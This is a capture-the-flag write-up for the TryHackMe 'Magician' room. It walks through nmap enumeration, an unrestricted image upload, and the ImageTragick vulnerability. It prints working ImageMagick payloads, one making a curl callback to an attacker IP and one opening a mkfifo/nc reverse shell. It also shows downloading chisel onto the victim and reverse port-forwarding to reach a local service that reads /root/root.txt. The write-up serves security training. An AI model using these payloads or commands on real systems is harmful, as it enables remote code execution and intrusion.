# Magician

At: [THM](https://tryhackme.com/room/magician)
By: [M0N573R777](https://tryhackme.com/p/M0N573R777) and [ripcurlz](https://tryhackme.com/p/ripcurlz)

Don't forget to add the IP to your `/etc/hosts` file as magician.thm!

## Enumeration 

As always I start with a basic `nmap` scan as `nmap -sC -sV -vv -oN nmap.txt $IP`</br>
```
PORT     STATE SERVICE    REASON         VERSION
21/tcp   open  ftp        syn-ack ttl 63 vsftpd 2.0.8 or later
8080/tcp open  http-proxy syn-ack ttl 63
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 404 
|     Vary: Origin
|     Vary: Access-Control-Request-Method
|     Vary: Access-Control-Request-Headers
|     Content-Type: application/json
|     Date: Sun, 21 Feb 2021 21:00:12 GMT
|     Connection: close
|     {"timestamp":"2021-02-21T21:00:12.474+0000","status":404,"error":"Not Found","message":"No message available","path":"/nice%20ports%2C/Tri%6Eity.txt%2ebak"}
|   GetRequest: 
|     HTTP/1.1 404 
|     Vary: Origin
|     Vary: Access-Control-Request-Method
|     Vary: Access-Control-Request-Headers
|     Content-Type: application/json
|     Date: Sun, 21 Feb 2021 21:00:12 GMT
|     Connection: close
|     {"timestamp":"2021-02-21T21:00:11.955+0000","status":404,"error":"Not Found","message":"No message available","path":"/"}
|   HTTPOptions: 
|     HTTP/1.1 404 
|     Vary: Origin
|     Vary: Access-Control-Request-Method
|     Vary: Access-Control-Request-Headers
|     Content-Type: application/json
|     Date: Sun, 21 Feb 2021 21:00:12 GMT
|     Connection: close
|     {"timestamp":"2021-02-21T21:00:12.168+0000","status":404,"error":"Not Found","message":"No message available","path":"/"}
|   RTSPRequest: 
|     HTTP/1.1 505 
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 465
|     Date: Sun, 21 Feb 2021 21:00:12 GMT
|     <!doctype html><html lang="en"><head><title>HTTP Status 505 
|     HTTP Version Not Supported</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 505 
|_    HTTP Version Not Supported</h1></body></html>
|_http-title: Site doesn't have a title (application/json).
8081/tcp open  http       syn-ack ttl 63 nginx 1.14.0 (Ubuntu)
|_http-favicon: Unknown favicon MD5: CA4D0E532A1010F93901DFCB3A9FC682
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: magician
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8080-TCP:V=7.91%I=7%D=2/21%Time=6032C9DA%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,13B,"HTTP/1\.1\x20404\x20\r\nVary:\x20Origin\r\nVary:\x20Acces
SF:s-Control-Request-Method\r\nVary:\x20Access-Control-Request-Headers\r\n
SF:Content-Type:\x20application/json\r\nDate:\x20Sun,\x2021\x20Feb\x202021
SF:\x2021:00:12\x20GMT\r\nConnection:\x20close\r\n\r\n{\"timestamp\":\"202
SF:1-02-21T21:00:11\.955\+0000\",\"status\":404,\"error\":\"Not\x20Found\"
SF:,\"message\":\"No\x20message\x20available\",\"path\":\"/\"}")%r(HTTPOpt
SF:ions,13B,"HTTP/1\.1\x20404\x20\r\nVary:\x20Origin\r\nVary:\x20Access-Co
SF:ntrol-Request-Method\r\nVary:\x20Access-Control-Request-Headers\r\nCont
SF:ent-Type:\x20application/json\r\nDate:\x20Sun,\x2021\x20Feb\x202021\x20
SF:21:00:12\x20GMT\r\nConnection:\x20close\r\n\r\n{\"timestamp\":\"2021-02
SF:-21T21:00:12\.168\+0000\",\"status\":404,\"error\":\"Not\x20Found\",\"m
SF:essage\":\"No\x20message\x20available\",\"path\":\"/\"}")%r(RTSPRequest
SF:,259,"HTTP/1\.1\x20505\x20\r\nContent-Type:\x20text/html;charset=utf-8\
SF:r\nContent-Language:\x20en\r\nContent-Length:\x20465\r\nDate:\x20Sun,\x
SF:2021\x20Feb\x202021\x2021:00:12\x20GMT\r\n\r\n<!doctype\x20html><html\x
SF:20lang=\"en\"><head><title>HTTP\x20Status\x20505\x20\xe2\x80\x93\x20HTT
SF:P\x20Version\x20Not\x20Supported</title><style\x20type=\"text/css\">bod
SF:y\x20{font-family:Tahoma,Arial,sans-serif;}\x20h1,\x20h2,\x20h3,\x20b\x
SF:20{color:white;background-color:#525D76;}\x20h1\x20{font-size:22px;}\x2
SF:0h2\x20{font-size:16px;}\x20h3\x20{font-size:14px;}\x20p\x20{font-size:
SF:12px;}\x20a\x20{color:black;}\x20\.line\x20{height:1px;background-color
SF::#525D76;border:none;}</style></head><body><h1>HTTP\x20Status\x20505\x2
SF:0\xe2\x80\x93\x20HTTP\x20Version\x20Not\x20Supported</h1></body></html>
SF:")%r(FourOhFourRequest,15E,"HTTP/1\.1\x20404\x20\r\nVary:\x20Origin\r\n
SF:Vary:\x20Access-Control-Request-Method\r\nVary:\x20Access-Control-Reque
SF:st-Headers\r\nContent-Type:\x20application/json\r\nDate:\x20Sun,\x2021\
SF:x20Feb\x202021\x2021:00:12\x20GMT\r\nConnection:\x20close\r\n\r\n{\"tim
SF:estamp\":\"2021-02-21T21:00:12\.474\+0000\",\"status\":404,\"error\":\"
SF:Not\x20Found\",\"message\":\"No\x20message\x20available\",\"path\":\"/n
SF:ice%20ports%2C/Tri%6Eity\.txt%2ebak\"}");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
Very long output, but interesting! Time to try port 8081

## WEB 

What I see: [magician web](magician-web.png)

Okay, so we can upload images. I fiddled around and found out that the upload was unrestricted. 

Also, after looking through the javascript I found that all the files can be foun on `http://$IP:8080/files` where links to the files are stored as json. Cool! But how can we get RCE?</br>

Since uploading a reverse shell and just curling it gives only the code again.... hmmmm... We are supposed to use our magic skills. Try searching for `image magick exploit` or look at the room tag. The `CVE` might give you some cool info!

## Exploit

A basic proof of concept from [PayLoadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Picture%20Image%20Magik/imagetragik1_payload_url_curl.png):
```
$ cat img.png

push graphic-context
viewbox 0 0 640 480
fill 'url(https://pre09.example.net/15bd/th/pre/f/2012/237/c/7/all_work_and_no_something/someting_by_nebezial-d5cdlor.jpg";curl "YOUR IP)'
pop graphic-context
```
Setup an `nc` listener at the same time:
```
$ nc -lvnp 80

connect to [YOUR IP] from (UNKNOWN) [10.10.188.169] 55362
GET / HTTP/1.1
Host: YOUR IP
User-Agent: curl/7.58.0
Accept: */*
```
And this will be the result. Awesome! Lets try upgrading it with a revershell (again from PayloadAllTheThings):
```
$ cat img.png

push graphic-context
encoding "UTF-8"
viewbox 0 0 1 1
affine 1 0 0 1 0 0
push graphic-context
image Over 0,0 1,1 '|mkfifo /tmp/gjdpez; nc IP PORT 0</tmp/gjdpez | /bin/sh >/tmp/gjdpez 2>&1; rm /tmp/gjdpez '
pop graphic-context
pop graphic-context

```
And a `nc` listener like so `nc -lvnp PORT`:
```bash
whoami
magician
```
Then we stabilize like so:
```bash
python3 -c "import pty;pty.spawn('/bin/bash')"
magician@magician:/tmp/hsperfdata_magician$ export TERM=xterm; export SHELL=/bin/bash
<magician$ export TERM=xterm; export SHELL=/bin/bash
magician@magician:/tmp/hsperfdata_magician$ ^Z  <-- this is CTRL + Z
[1]+  Stopped                 nc -lvnp 8888
root@kali:~/CTFs/TryHackMe/magician# stty raw -echo;fg
```
Lets explore

## USER FLAG

Just navigate to the home directory :)

## PRIVESC

What do we have in the home directory?
```bash
magician@magician:~$ ls -l
total 17168
-rw-r--r-- 1 root     root     17565546 Jan 30 11:55 spring-boot-magician-backend-0.0.1-SNAPSHOT.jar
-rw-r--r-- 1 magician magician      170 Feb 13 07:19 the_magic_continues
drwxr-xr-x 2 root     root         4096 Feb  5 05:14 uploads
-rw-r--r-- 1 magician magician       24 Jan 30 11:30 user.txt
```
Interesting, lets check out uploads and `the_magic_continues`:
```bash
magician@magician:~$ cat the_magic_continues 
The magician is known to keep a locally listening cat up his sleeve, it is said to be an oracle who will tell you secrets if you are good enough to understand its meows.
```
Uhm, okay? The oracle and locally listening part show us we should thoroughly search the machine!
```
find /  -type f -user root -perm /4000 2>/dev/null
```
Gives us nothing. However running `nestat -l` to look for local listening ports showed something interesting:
```
magician@magician:~$ netstat -l
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        0      0 localhost:6666          0.0.0.0:*               LISTEN 
```
Port 6666 on local? Whats there?! Time to port forward, and since I hate doing it manually its time to use [chisel](https://github.com/jpillora/chisel). For kali just simply `apt-get install chisel` and then copy over the binary to the victim. On your machine:
```
cd /path/where/chisel/is
python3 -m http.server 8080
```
on the victim:
```
wget IP:8080/chisel
chmod +x chisel
```
Time to portforward now, on your host:
```
root@kali:~/CTFs/TryHackMe/magician# chisel server --reverse --port 9002
```
And then on the victim machine:
```
./chisel client 10.8.147.71:9002 R:9001:127.0.0.1:6666
```
Now you should be able to access the website from your browser at `localhost:9001`!</br>
[magic-cat.png](magic-cat.png)
The prompt says to enter a file name... lets be bold... `/root/root.txt` And voila! It works! Now I got two outputs, hex and binary. Whichever you get, decode it get your well deserved flag!
